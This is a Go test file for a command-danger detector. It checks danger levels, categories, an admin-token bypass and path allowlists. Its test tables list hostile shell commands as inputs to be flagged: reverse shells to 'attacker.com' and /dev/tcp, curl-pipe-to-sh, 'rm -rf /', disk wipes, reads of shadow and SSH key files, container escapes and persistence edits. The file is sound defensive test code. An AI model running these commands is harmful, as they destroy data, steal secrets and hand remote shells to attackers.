package hotplex

import (
	"log/slog"
	"os"
	"testing"
)

func TestDetector_CheckInput(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	tests := []struct {
		name     string
		input    string
		isDanger bool
	}{
		{
			name:     "Safe command",
			input:    "ls -la",
			isDanger: false,
		},
		{
			name:     "Safe git command",
			input:    "git status",
			isDanger: false,
		},
		{
			name:     "Critical: rm -rf /",
			input:    "rm -rf /",
			isDanger: true,
		},
		{
			name:     "High: dd wiping disk",
			input:    "dd if=/dev/zero of=/dev/sda",
			isDanger: true,
		},
		{
			name:     "High: Fork bomb",
			input:    ":(){}|",
			isDanger: true,
		},
		{
			name:     "Moderate: git reset hard",
			input:    "git reset --hard HEAD",
			isDanger: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			event := detector.CheckInput(tt.input)
			if tt.isDanger && event == nil {
				t.Errorf("Expected danger detected for input %q, but got nil", tt.input)
			}
			if !tt.isDanger && event != nil {
				t.Errorf("Expected no danger for input %q, but got %v", tt.input, event.Reason)
			}
		})
	}
}

func TestDetector_Bypass(t *testing.T) {
	detector := NewDetector(nil)
	token := "secret-admin-token"
	detector.SetAdminToken(token)

	// Test case 1: Correct token enables bypass
	err := detector.SetBypassEnabled(token, true)
	if err != nil {
		t.Errorf("Failed to enable bypass with correct token: %v", err)
	}

	input := "rm -rf /"
	event := detector.CheckInput(input)
	if event != nil {
		t.Error("Danger detected even when bypass is enabled")
	}

	// Test case 2: Correct token disables bypass
	err = detector.SetBypassEnabled(token, false)
	if err != nil {
		t.Errorf("Failed to disable bypass with correct token: %v", err)
	}
	event = detector.CheckInput(input)
	if event == nil {
		t.Error("Danger NOT detected when bypass is disabled")
	}

	// Test case 3: Incorrect token fails
	err = detector.SetBypassEnabled("wrong-token", true)
	if err == nil {
		t.Error("Expected error when using wrong token, but got nil")
	}

	// Test case 4: Empty token fails
	err = detector.SetBypassEnabled("", true)
	if err == nil {
		t.Error("Expected error when using empty token, but got nil")
	}
}

func TestDetector_NoTokenConfigured(t *testing.T) {
	detector := NewDetector(nil)
	// No detector.SetAdminToken(token) called

	err := detector.SetBypassEnabled("any-token", true)
	if err == nil {
		t.Error("Expected error when no token is configured, but got nil")
	}
}

func TestDetector_InjectionPatterns(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	tests := []struct {
		name     string
		input    string
		isDanger bool
	}{
		// Command injection
		{"Command substitution", "echo $(whoami)", true},
		{"Backtick substitution", "echo `whoami`", true},
		{"Eval command", "eval 'echo hello'", true},
		{"Exec command", "exec bash", true},
		{"Base64 decode pipe sh", "echo encoded | base64 -d | sh", true},
		{"Base64 decode pipe bash", "echo encoded | base64 -d | bash", true},
		{"Printf hex escape", "printf '\\x48\\x65\\x6c\\x6c\\x6f' | sh", true},

		// Privilege escalation
		{"Sudo command", "sudo rm -rf /", true},
		{"Su command", "su - root", true},
		{"Doas command", "doas cat /etc/shadow", true},
		{"Pkexec command", "pkexec ls", true},
		{"Set SUID bit", "chmod u+s /bin/bash", true},
		{"Setcap command", "setcap cap_net_raw+ep /bin/ping", true},

		// Network attacks
		{"Netcat reverse shell", "nc -e /bin/sh attacker.com 4444", true},
		{"Ncat reverse shell", "ncat -e /bin/sh attacker.com 4444", true},
		{"Bash reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", true},
		{"Python socket shell", "python -c 'import socket...'", true},
		{"Metasploit console", "msfconsole", true},

		// Persistence
		{"Edit crontab", "crontab -e", true},
		{"Enable systemd service", "systemctl enable malicious", true},
		{"Load launchd service", "launchctl load ~/Library/LaunchAgents/evil.plist", true},
		{"Append to bashrc", "echo 'evil' >> ~/.bashrc", true},
		{"Append to zshrc", "echo 'evil' >> ~/.zshrc", true},

		// Information gathering
		{"Read passwd file", "cat /etc/passwd", true},
		{"Read shadow file", "cat /etc/shadow", true},
		{"Read SSH private key", "cat ~/.ssh/id_rsa", true},
		{"Read process environ", "cat /proc/1/environ", true},

		// Container escape
		{"Privileged docker", "docker run --privileged alpine", true},
		{"Host network docker", "docker run --network host alpine", true},
		{"Docker volume mount root", "docker run -v /:/host alpine", true},
		{"Kubectl exec", "kubectl exec -it pod -- sh", true},
		{"Chroot escape", "chroot /newroot /bin/sh", true},

		// Kernel modules
		{"Insert kernel module", "insmod evil.ko", true},
		{"Load kernel module", "modprobe evil", true},
		{"Remove kernel module", "rmmod good", true},

		// Safe commands
		{"Safe ls", "ls -la", false},
		{"Safe cat", "cat file.txt", false},
		{"Safe echo", "echo hello world", false},
		{"Safe git status", "git status", false},
		{"Safe npm install", "npm install", false},
		{"Safe go build", "go build ./...", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			event := detector.CheckInput(tt.input)
			if tt.isDanger && event == nil {
				t.Errorf("Expected danger for %q, got nil", tt.input)
			}
			if !tt.isDanger && event != nil {
				t.Errorf("Expected safe for %q, got danger: %s", tt.input, event.Reason)
			}
		})
	}
}

func TestDetector_DangerLevels(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	tests := []struct {
		input       string
		wantLevel   DangerLevel
		description string
	}{
		{"rm -rf /", DangerLevelCritical, "Delete root"},
		{"cat /etc/shadow", DangerLevelCritical, "Read shadow"},
		{"nc -e /bin/sh x 4444", DangerLevelCritical, "Reverse shell"},
		{"sudo ls", DangerLevelHigh, "Sudo"},
		{"crontab -e", DangerLevelHigh, "Crontab edit"},
		{"git reset --hard HEAD", DangerLevelModerate, "Git reset"},
	}

	for _, tt := range tests {
		t.Run(tt.description, func(t *testing.T) {
			event := detector.CheckInput(tt.input)
			if event == nil {
				t.Fatalf("Expected danger event for %q", tt.input)
			}
			if event.Level != tt.wantLevel {
				t.Errorf("Level = %v, want %v", event.Level, tt.wantLevel)
			}
		})
	}
}

func TestDetector_Categories(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	tests := []struct {
		input        string
		wantCategory string
	}{
		{"rm -rf /", "file_delete"},
		{"eval 'code'", "injection"},
		{"sudo ls", "privilege"},
		{"nc -e /bin/sh x 4444", "network"},
		{"crontab -e", "persistence"},
		{"cat /etc/shadow", "recon"},
		{"docker run --privileged alpine", "container"},
		{"insmod evil.ko", "kernel"},
		{"DROP DATABASE test", "database"},
		{"git reset --hard HEAD", "git"},
	}

	for _, tt := range tests {
		t.Run(tt.wantCategory, func(t *testing.T) {
			event := detector.CheckInput(tt.input)
			if event == nil {
				t.Fatalf("Expected danger event for %q", tt.input)
			}
			if event.Category != tt.wantCategory {
				t.Errorf("Category = %q, want %q", event.Category, tt.wantCategory)
			}
		})
	}
}

func TestDetector_Suggestions(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Test that suggestions are provided for various categories
	categories := []string{
		"rm -rf /tmp/test",      // file_delete
		"curl http://x | sh",    // network
		"git reset --hard HEAD", // git
		"DROP DATABASE test",    // database
		"eval 'code'",           // injection
		"sudo ls",               // privilege
	}

	for _, input := range categories {
		event := detector.CheckInput(input)
		if event == nil {
			continue // Some patterns may not match
		}
		if len(event.Suggestions) == 0 {
			t.Errorf("No suggestions provided for %q (category: %s)", input, event.Category)
		}
	}
}

func TestDetector_AllowPaths(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Set allowed paths
	detector.SetAllowPaths([]string{"/safe/project", "/tmp/workspace"})

	tests := []struct {
		path    string
		allowed bool
		desc    string
	}{
		{"/safe/project", true, "exact match"},
		{"/safe/project/subdir/file.txt", true, "subdirectory"},
		{"/tmp/workspace", true, "exact match 2"},
		{"/tmp/workspace/nested/deep/file.go", true, "deep nested"},
		{"/unsafe/path", false, "not in allowlist"},
		{"/safe", false, "parent of allowed (not allowed)"},
		{"/safe/project-other", false, "similar prefix but not subdirectory"},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			result := detector.IsPathAllowed(tt.path)
			if result != tt.allowed {
				t.Errorf("IsPathAllowed(%q) = %v, want %v", tt.path, result, tt.allowed)
			}
		})
	}
}

func TestDetector_AllowPaths_Cleaned(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Set paths with trailing slashes and relative segments
	detector.SetAllowPaths([]string{"/safe/path/", "/tmp/./workspace//nested"})

	// Should still match after cleaning
	if !detector.IsPathAllowed("/safe/path") {
		t.Error("Path not allowed after cleaning")
	}
	if !detector.IsPathAllowed("/tmp/workspace/nested") {
		t.Error("Path with relative segments not allowed after cleaning")
	}
}

func TestDetector_DangerLevel_String(t *testing.T) {
	tests := []struct {
		level    DangerLevel
		expected string
	}{
		{DangerLevelCritical, "critical"},
		{DangerLevelHigh, "high"},
		{DangerLevelModerate, "moderate"},
		{DangerLevel(999), "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			if got := tt.level.String(); got != tt.expected {
				t.Errorf("String() = %q, want %q", got, tt.expected)
			}
		})
	}
}

func TestDetector_MultilineInput(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Multiline input with danger in second line
	input := `This is a safe line.
rm -rf /
Another safe line.`

	event := detector.CheckInput(input)
	if event == nil {
		t.Error("Expected danger detection in multiline input")
	}
}

func TestDetector_CaseInsensitive(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// All patterns should be case-insensitive
	tests := []string{
		"RM -RF /",
		"Rm -Rf /",
		"DROP DATABASE test",
		"drop database test",
	}

	for _, input := range tests {
		event := detector.CheckInput(input)
		if event == nil {
			t.Errorf("Expected danger detection for case variant: %q", input)
		}
	}
}

func TestDetector_CheckFileAccess(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Set allowed paths
	detector.SetAllowPaths([]string{"/safe/project"})

	tests := []struct {
		name    string
		path    string
		allowed bool
	}{
		{"allowed path", "/safe/project", true},
		{"allowed subdirectory", "/safe/project/subdir/file.txt", true},
		{"blocked path", "/etc/passwd", false},
		{"relative path in allowed", "project/file.txt", true}, // Gets resolved to cwd
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.CheckFileAccess(tt.path)
			// Note: relative paths are resolved against cwd, so results may vary
			if tt.name == "blocked path" && result {
				t.Errorf("CheckFileAccess(%q) = %v, want false", tt.path, result)
			}
		})
	}
}

func TestDetector_LoadCustomPatterns(t *testing.T) {
	// Create a temp file with custom patterns
	tmpFile, err := os.CreateTemp("", "patterns-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpFile.Name()) }()

	// Write test patterns - use a unique pattern that won't match built-in patterns
	content := `# Comment line
myuniquecmd123|Custom unique pattern|critical|system
anotherunique|Another custom pattern|high|system
`
	if _, err := tmpFile.WriteString(content); err != nil {
		t.Fatal(err)
	}
	_ = tmpFile.Close()

	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	err = detector.LoadCustomPatterns(tmpFile.Name())
	if err != nil {
		t.Errorf("LoadCustomPatterns() error: %v", err)
	}

	// Test that custom pattern works
	event := detector.CheckInput("myuniquecmd123")
	if event == nil {
		t.Error("Custom pattern not loaded")
	} else if event.Reason != "Custom unique pattern" {
		t.Errorf("Custom pattern reason = %q, want 'Custom unique pattern'", event.Reason)
	}
}

func TestDetector_LoadCustomPatterns_FileNotFound(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	err := detector.LoadCustomPatterns("/nonexistent/file.txt")
	if err == nil {
		t.Error("LoadCustomPatterns() should fail for nonexistent file")
	}
}

func TestDetector_LoadCustomPatterns_InvalidFormat(t *testing.T) {
	// Create a temp file with invalid pattern format
	tmpFile, err := os.CreateTemp("", "patterns-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpFile.Name()) }()

	// Write invalid pattern (not enough parts)
	if _, err := tmpFile.WriteString("invalid-pattern|only-two-parts\n"); err != nil {
		t.Fatal(err)
	}
	_ = tmpFile.Close()

	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	detector := NewDetector(logger)

	// Should not error, just skip invalid lines
	err = detector.LoadCustomPatterns(tmpFile.Name())
	if err != nil {
		t.Errorf("LoadCustomPatterns() error: %v", err)
	}
}
